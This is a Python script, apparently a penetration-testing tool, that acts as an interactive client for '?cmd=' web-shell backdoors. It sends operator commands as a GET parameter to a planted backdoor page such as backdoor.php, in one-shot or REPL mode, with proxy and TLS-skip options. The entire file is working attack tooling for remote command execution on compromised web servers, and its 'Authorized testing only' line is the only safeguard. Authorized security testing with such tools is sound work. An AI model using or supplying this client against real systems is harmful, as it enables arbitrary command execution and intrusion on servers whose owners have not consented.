#!/usr/bin/env python3
"""Interactive web-shell client for ?cmd= style backdoors.

Sends GET requests with a `cmd` parameter (or attacker-controlled name via --param)
and prints the response body. Supports a one-shot payload (`--payload`) or an
interactive REPL (`--interactive`).

Usage:
    # one-shot
    python3 web_shell.py -t http://target/backdoor.php -p "id"

    # interactive
    python3 web_shell.py -t http://target/backdoor.php --interactive

Authorized testing only.
"""
import argparse
import os
import sys
import time

import requests


def fetch(session: requests.Session, target: str, param: str, payload: str,
          timeout: float) -> str | None:
    try:
        r = session.get(target, params={param: payload}, timeout=timeout)
    except requests.exceptions.SSLError as exc:
        print(f"[!] TLS error: {exc} (use --no-ssl-verify to disable verification)", file=sys.stderr)
        return None
    except requests.exceptions.InvalidSchema:
        print("[!] Invalid URL schema: use http:// or https://", file=sys.stderr)
        return None
    except requests.exceptions.ConnectionError as exc:
        print(f"[!] Connection error: {exc}", file=sys.stderr)
        return None
    except requests.exceptions.Timeout:
        print(f"[!] Timeout after {timeout}s", file=sys.stderr)
        return None
    except requests.exceptions.RequestException as exc:
        print(f"[!] Request error: {exc}", file=sys.stderr)
        return None
    return r.text


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("-t", "--target", required=True,
                        help="Target URL, e.g. http://10.0.0.1:3001/uploads/backdoor.php")
    parser.add_argument("-p", "--payload", help="Single command to execute (one-shot mode)")
    parser.add_argument("--param", default="cmd", help="Query-parameter name (default: cmd)")
    parser.add_argument("--interactive", "-i", action="store_true",
                        help="Drop into interactive REPL after optional --payload run")

    verify_group = parser.add_mutually_exclusive_group()
    verify_group.add_argument("--ssl-verify", dest="ssl_verify", action="store_true",
                              help="Verify TLS certificates (default)")
    verify_group.add_argument("--no-ssl-verify", dest="ssl_verify", action="store_false",
                              help="Skip TLS verification (testing self-signed targets)")
    parser.set_defaults(ssl_verify=True)

    parser.add_argument("--timeout", type=float, default=15.0,
                        help="Per-request timeout in seconds (default: 15)")
    parser.add_argument("--proxy", default=None, help="HTTP(S) proxy URL")
    parser.add_argument("--delay", type=float, default=0.3,
                        help="Seconds to sleep between interactive requests (default: 0.3)")
    args = parser.parse_args()

    session = requests.Session()
    session.verify = args.ssl_verify
    if args.proxy:
        session.proxies = {"http": args.proxy, "https": args.proxy}
    if not args.ssl_verify:
        # Suppress the noisy InsecureRequestWarning when --no-ssl-verify is intentional.
        try:
            from urllib3.exceptions import InsecureRequestWarning
            import urllib3
            urllib3.disable_warnings(InsecureRequestWarning)
        except ImportError:
            pass

    if args.payload:
        text = fetch(session, args.target, args.param, args.payload, args.timeout)
        if text is not None:
            print(text)
        if not args.interactive:
            return 0

    if args.interactive or not args.payload:
        if args.interactive:
            os.system("clear" if os.name != "nt" else "cls")
        try:
            while True:
                try:
                    cmd = input("$ ")
                except EOFError:
                    return 0
                text = fetch(session, args.target, args.param, cmd, args.timeout)
                if text is not None:
                    print(text)
                time.sleep(args.delay)
        except KeyboardInterrupt:
            print("\n[!] Interrupted.", file=sys.stderr)
            return 130

    return 0


if __name__ == "__main__":
    sys.exit(main())
